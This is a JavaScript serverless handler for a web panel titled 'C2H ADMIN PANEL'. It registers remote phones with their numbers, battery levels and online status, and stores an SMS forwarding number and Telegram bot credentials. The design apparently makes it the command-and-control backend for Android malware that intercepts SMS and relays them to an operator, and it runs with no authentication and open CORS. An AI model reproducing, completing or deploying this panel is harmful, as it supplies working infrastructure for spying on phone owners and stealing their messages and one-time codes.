// Simple working version
let devices = [];
let settings = {};

export default async function handler(req, res) {
  console.log('📡 Request:', req.method, req.url);
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    console.log('✅ CORS preflight');
    return res.end();
  }
  
  const url = req.url;
  const method = req.method;
  
  try {
    // Parse body only for POST requests
    let body = {};
    if (method === 'POST') {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (buffer.length > 0) {
        body = JSON.parse(buffer.toString());
      }
    }
    
    console.log('📦 Body:', body);
    
    const now = () => new Date().toISOString().slice(0, 19).replace('T', ' ');
    
    // 1. DEVICE REGISTER
    if (url === '/api/device/register' && method === 'POST') {
      console.log('📱 Device register request');
      
      const { device_id, device_name, os_version, battery_level, phone_number } = body;
      const currentTime = now();
      
      // Find existing device
      const existingIndex = devices.findIndex(d => d.device_id === device_id);
      
      if (existingIndex >= 0) {
        // Update existing
        devices[existingIndex] = {
          ...devices[existingIndex],
          device_name: device_name || devices[existingIndex].device_name,
          os_version: os_version || devices[existingIndex].os_version,
          phone_number: phone_number || devices[existingIndex].phone_number,
          battery_level: battery_level || devices[existingIndex].battery_level,
          last_seen: currentTime
        };
      } else {
        // Add new device
        devices.push({
          device_id,
          device_name: device_name || 'Unknown',
          os_version: os_version || 'Unknown',
          phone_number: phone_number || 'N/A',
          battery_level: battery_level || 0,
          last_seen: currentTime,
          created_at: currentTime
        });
      }
      
      console.log('✅ Device saved:', device_id);
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({ 
        status: 'success', 
        message: 'Device updated' 
      }));
    }
    
    // 2. GET DEVICES
    if (url === '/api/devices' && method === 'GET') {
      console.log('📋 Get devices request');
      
      const result = devices.map(device => ({
        device_id: device.device_id,
        device_name: device.device_name,
        os_version: device.os_version,
        phone_number: device.phone_number,
        battery_level: device.battery_level,
        last_seen: device.last_seen,
        created_at: device.created_at,
        is_online: (Date.now() - new Date(device.last_seen).getTime()) < 20000
      }));
      
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify(result));
    }
    
    // 3. DELETE DEVICE
    if (url.startsWith('/api/device/') && method === 'DELETE') {
      const deviceId = url.split('/')[3];
      devices = devices.filter(d => d.device_id !== deviceId);
      
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({ status: 'success' }));
    }
    
    // 4. SMS FORWARD NUMBER
    if (url === '/api/config/sms_forward') {
      if (method === 'POST') {
        settings.sms_forward_number = body.forward_number;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({ 
          forward_number: settings.sms_forward_number || '' 
        }));
      }
    }
    
    // 5. TELEGRAM SETTINGS
    if (url === '/api/config/telegram') {
      if (method === 'POST') {
        settings.telegram_bot_token = body.telegram_bot_token;
        settings.telegram_chat_id = body.telegram_chat_id;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          telegram_bot_token: settings.telegram_bot_token || '',
          telegram_chat_id: settings.telegram_chat_id || ''
        }));
      }
    }
    
    // 6. SERVE PANEL HTML
    if (url === '/' || url === '/index.html') {
      console.log('🏠 Serving panel HTML');
      
      const html = `<!DOCTYPE html>
<html>
<head>
    <title>C2H Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background:#1a1a1a; color:#fff; padding:20px; font-family:Arial; }
        .header { text-align:center; padding:20px; }
        h1 { color:#3a86ff; }
        .btn { width:100%; padding:15px; margin:10px 0; background:#3a86ff; color:white; border:none; border-radius:8px; }
        .device { background:#2a2a2a; padding:15px; margin:10px 0; border-radius:8px; }
        .online { color:green; }
        .offline { color:red; }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2H ADMIN PANEL</h1>
        <p>🚀 Server is working!</p>
    </div>
    <button class="btn" onclick="alert('Test')">TEST BUTTON</button>
    <div id="devices">Panel loaded successfully</div>
    <script>
        console.log('Panel loaded');
    </script>
</body>
</html>`;
      
      res.setHeader('Content-Type', 'text/html');
      return res.end(html);
    }
    
    // 7. 404
    console.log('❌ Route not found:', url);
    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({ error: 'Route not found' }));
    
  } catch (error) {
    console.error('❌ Server error:', error);
    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({ 
      error: 'Server error',
      message: error.message 
    }));
  }
}
